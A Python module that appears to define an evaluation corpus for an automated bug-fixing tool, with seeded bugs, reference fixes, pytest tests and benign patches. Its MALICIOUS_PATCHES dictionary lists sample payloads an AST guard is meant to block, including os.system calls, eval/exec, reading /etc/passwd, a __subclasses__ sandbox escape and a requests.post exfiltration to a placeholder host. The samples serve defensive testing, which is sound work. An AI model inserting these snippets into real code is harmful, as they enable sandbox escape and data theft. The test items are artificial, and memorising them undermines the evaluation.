"""Evaluation corpus for MendOps.

Three datasets:

* ``BUG_CASES``        - seeded real-world bugs, each with the buggy code, a
                         reference fix, and a pytest oracle. Used to measure
                         end-to-end remediation and validate the test oracle.
* ``MALICIOUS_PATCHES`` - sandbox-escape / exfiltration / code-exec payloads
                         the AST guard must block (security recall).
* ``BENIGN_PATCHES``   - safe patches the guard must allow (false-positive rate).
"""

from dataclasses import dataclass


@dataclass(frozen=True)
class BugCase:
    id: str
    category: str
    title: str
    body: str
    buggy: str
    fixed: str
    tests: str


BUG_CASES: list[BugCase] = [
    BugCase(
        id="empty_average",
        category="ZeroDivisionError",
        title="average() crashes on empty list",
        body="average([]) raises ZeroDivisionError. It should return 0.0.",
        buggy="def average(values):\n    return sum(values) / len(values)\n",
        fixed="def average(values):\n    if not values:\n        return 0.0\n    return sum(values) / len(values)\n",
        tests="def test_average_normal():\n    assert average([2, 4, 6]) == 4.0\n\n\ndef test_average_empty():\n    assert average([]) == 0.0\n",
    ),
    BugCase(
        id="first_element",
        category="IndexError",
        title="first_or_none() raises IndexError on empty input",
        body="Accessing items[0] crashes when items is empty. Return None instead.",
        buggy="def first_or_none(items):\n    return items[0]\n",
        fixed="def first_or_none(items):\n    return items[0] if items else None\n",
        tests="def test_first_present():\n    assert first_or_none([10, 20]) == 10\n\n\ndef test_first_empty():\n    assert first_or_none([]) is None\n",
    ),
    BugCase(
        id="dict_lookup",
        category="KeyError",
        title="get_price() raises KeyError for unknown item",
        body="Looking up a missing key crashes. Default to 0.0 when not found.",
        buggy="def get_price(prices, name):\n    return prices[name]\n",
        fixed="def get_price(prices, name):\n    return prices.get(name, 0.0)\n",
        tests="def test_price_present():\n    assert get_price({'a': 1.5}, 'a') == 1.5\n\n\ndef test_price_missing():\n    assert get_price({'a': 1.5}, 'b') == 0.0\n",
    ),
    BugCase(
        id="safe_int",
        category="ValueError",
        title="to_int() crashes on non-numeric text",
        body="int('x') raises ValueError. Return 0 for unparseable input.",
        buggy="def to_int(text):\n    return int(text)\n",
        fixed="def to_int(text):\n    try:\n        return int(text)\n    except (ValueError, TypeError):\n        return 0\n",
        tests="def test_int_valid():\n    assert to_int('42') == 42\n\n\ndef test_int_invalid():\n    assert to_int('x') == 0\n",
    ),
    BugCase(
        id="none_handling",
        category="AttributeError",
        title="shout() crashes when name is None",
        body="name.upper() fails for None. Handle the empty case gracefully.",
        buggy="def shout(name):\n    return name.upper() + '!'\n",
        fixed="def shout(name):\n    if not name:\n        return '!'\n    return name.upper() + '!'\n",
        tests="def test_shout_name():\n    assert shout('hi') == 'HI!'\n\n\ndef test_shout_none():\n    assert shout(None) == '!'\n",
    ),
    BugCase(
        id="factorial_negative",
        category="RecursionError",
        title="factorial() recurses forever on negative input",
        body="factorial(-1) never terminates. Raise ValueError for negatives.",
        buggy="def factorial(n):\n    if n == 0:\n        return 1\n    return n * factorial(n - 1)\n",
        fixed="def factorial(n):\n    if n < 0:\n        raise ValueError('n must be non-negative')\n    if n == 0:\n        return 1\n    return n * factorial(n - 1)\n",
        tests="def test_factorial_positive():\n    assert factorial(5) == 120\n\n\ndef test_factorial_negative():\n    try:\n        factorial(-1)\n        assert False\n    except ValueError:\n        assert True\n",
    ),
    BugCase(
        id="inclusive_sum",
        category="OffByOne",
        title="sum_to(n) excludes n from the total",
        body="sum_to(5) returns 10 but should return 15 (1..n inclusive).",
        buggy="def sum_to(n):\n    total = 0\n    for i in range(n):\n        total += i\n    return total\n",
        fixed="def sum_to(n):\n    total = 0\n    for i in range(n + 1):\n        total += i\n    return total\n",
        tests="def test_sum_to_five():\n    assert sum_to(5) == 15\n\n\ndef test_sum_to_zero():\n    assert sum_to(0) == 0\n",
    ),
    BugCase(
        id="empty_max",
        category="ValueError",
        title="safe_max() raises ValueError on empty list",
        body="max([]) raises ValueError. Return 0 when there are no values.",
        buggy="def safe_max(values):\n    return max(values)\n",
        fixed="def safe_max(values):\n    return max(values) if values else 0\n",
        tests="def test_max_present():\n    assert safe_max([3, 9, 1]) == 9\n\n\ndef test_max_empty():\n    assert safe_max([]) == 0\n",
    ),
    BugCase(
        id="percentage_rounding",
        category="LogicError",
        title="percentage() returns unrounded value and divides by zero",
        body="percentage(1, 3) should be 33.33 and percentage(1, 0) should be 0.0.",
        buggy="def percentage(part, whole):\n    return part / whole * 100\n",
        fixed="def percentage(part, whole):\n    if whole == 0:\n        return 0.0\n    return round(part / whole * 100, 2)\n",
        tests="def test_percentage_value():\n    assert percentage(1, 3) == 33.33\n\n\ndef test_percentage_zero():\n    assert percentage(1, 0) == 0.0\n",
    ),
    BugCase(
        id="mutable_default",
        category="MutableDefault",
        title="append_item() shares state across calls",
        body="The default list argument leaks between calls. Use None sentinel.",
        buggy="def append_item(item, bucket=[]):\n    bucket.append(item)\n    return bucket\n",
        fixed="def append_item(item, bucket=None):\n    if bucket is None:\n        bucket = []\n    bucket.append(item)\n    return bucket\n",
        tests="def test_append_isolated():\n    assert append_item(1) == [1]\n    assert append_item(2) == [2]\n",
    ),
]


MALICIOUS_PATCHES: dict[str, str] = {
    "os_system": "import os\nos.system('id')\n",
    "subprocess": "import subprocess\nsubprocess.run(['ls'])\n",
    "aliased_import": "import os as o\n\ndef run():\n    return o.getcwd()\n",
    "from_import": "from os import system\nsystem('id')\n",
    "dunder_import": "x = __import__('os')\n",
    "eval_call": "def run(p):\n    return eval(p)\n",
    "exec_call": "def run(p):\n    exec(p)\n",
    "compile_exec": "def run(p):\n    exec(compile(p, '<s>', 'exec'))\n",
    "eval_alias": "f = eval\n\ndef run(p):\n    return f(p)\n",
    "open_file": "def run():\n    return open('/etc/passwd').read()\n",
    "getattr_escape": "def run(o):\n    return getattr(o, '__class__')\n",
    "subclasses_escape": "def run():\n    return ().__class__.__bases__[0].__subclasses__()\n",
    "func_globals": "def run(f):\n    return f.__globals__\n",
    "requests_exfil": "import requests\nrequests.post('http://x', data='secret')\n",
    "socket_exfil": "import socket\ns = socket.socket()\n",
    "pickle_rce": "import pickle\npickle.loads(b'')\n",
    "importlib_bypass": "import importlib\nimportlib.import_module('os')\n",
}


BENIGN_PATCHES: dict[str, str] = {
    "simple_logic": "def avg(xs):\n    return sum(xs) / len(xs) if xs else 0.0\n",
    "math_import": "import math\n\ndef hypot(a, b):\n    return math.sqrt(a * a + b * b)\n",
    "json_import": "import json\n\ndef dumps(d):\n    return json.dumps(d)\n",
    "regex_import": "import re\n\ndef digits(s):\n    return re.findall(r'\\d+', s)\n",
    "collections_import": "from collections import defaultdict\n\ndef group(xs):\n    d = defaultdict(list)\n    for k, v in xs:\n        d[k].append(v)\n    return d\n",
    "typing_import": "from typing import Optional\n\ndef first(xs) -> Optional[int]:\n    return xs[0] if xs else None\n",
    "statistics_import": "import statistics\n\ndef med(xs):\n    return statistics.median(xs) if xs else 0.0\n",
    "try_except": "def parse(s):\n    try:\n        return int(s)\n    except ValueError:\n        return 0\n",
    "isinstance_check": "def label(x):\n    return 'num' if isinstance(x, (int, float)) else 'other'\n",
    "comprehension": "def squares(n):\n    return [i * i for i in range(n)]\n",
}
